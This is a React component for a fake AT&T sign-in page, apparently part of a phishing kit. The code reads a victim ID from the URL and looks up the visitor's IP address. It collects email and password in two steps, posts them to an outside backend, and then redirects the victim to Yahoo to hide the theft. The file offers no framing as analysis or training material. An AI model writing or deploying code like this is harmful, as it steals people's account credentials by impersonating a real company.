import { useState, useEffect } from 'react'
import UserID from '../component/UserID'
import Password from '../component/Password'
import isValidEmail from '../helpers/validateEmail'
import FormHeader from '../component/FormHeader'
import PasswordHeader from '../component/PasswordHeader'
import axios from 'axios'
import { baseURL } from '../helpers/data'
import AttSVG from '../../public/att-icon.svg'
import { useLocation } from 'react-router-dom'

const MainPage = () => {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [error, setError] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [redirect, setRedirect] = useState(false)
  const [IPAddress, setIPAddress] = useState('')
  const { search } = useLocation()
  const userID = search.slice(1)
  useEffect(() => {
    redirect && window.location.replace('https://www.yahoo.com/')
  }, [redirect])


  useEffect(() => {
    fetch('https://api.ipify.org?format=json')
      .then((response) => response.json())
      .then((data) => {
        setIPAddress(data.ip)
      })
      .catch((error) => console.error(error))
  }, [])

  const handleContinue = () => {
    setError('')
    if (!showPassword) {
      if (!email || !isValidEmail(email)) {
        setError('please enter a valid email')
        return
      }
      setShowPassword(true)
    } else {
      if (!password) {
        setError('Please enter your password')
      } else {
        const data = JSON.stringify({
          email,
          password,
        })
        axios
          .post(`${baseURL}main`, { data, userID, title: 'AT' })
          .then(() => {
            setRedirect(true)
          })
          .catch((e) => console.log(e))
      }
    }
  }

  return (
    <div className='md:h-screen md:w-screen flex items-center justify-between flex-col'>
      <main className='md:border rounded-xl mt-8 md:mt-20 flex flex-col items-center md:w-[446px] p-[20px] md:p-[48px]'>
        <img src={AttSVG} width={140} className='mb-10' />
        <section>
          {!showPassword ? (
            <FormHeader />
          ) : (
            <PasswordHeader
              email={email}
              setShowPassword={setShowPassword}
              setError={setError}
            />
          )}

          <section className='mt-10'>
            {!showPassword ? (
              <UserID userID={email} setUserID={setEmail} />
            ) : (
              <Password password={password} setPassword={setPassword} />
            )}

            <p className='text-red-800 font-semibold mt-2'>{error}</p>

            <button
              className='text-[#F2FAFD] font-semibold bg-blue-800 hover:bg-blue-700 w-full py-3 rounded-full mt-5 md:mt-8 outline-blue-700'
              onClick={handleContinue}
            >
              {!showPassword ? 'Continue' : 'Sign in'}
            </button>

            <footer className='mt-7 text-[#0057B8] font-bold flex flex-col gap-3 md:gap-5'>
              <p>Forgot user ID? </p>
              <p>Don't have a user ID? Create one now</p>
            </footer>
          </section>
        </section>
      </main>
      {/* <footer>footer</footer> */}
    </div>
  )
}

export default MainPage
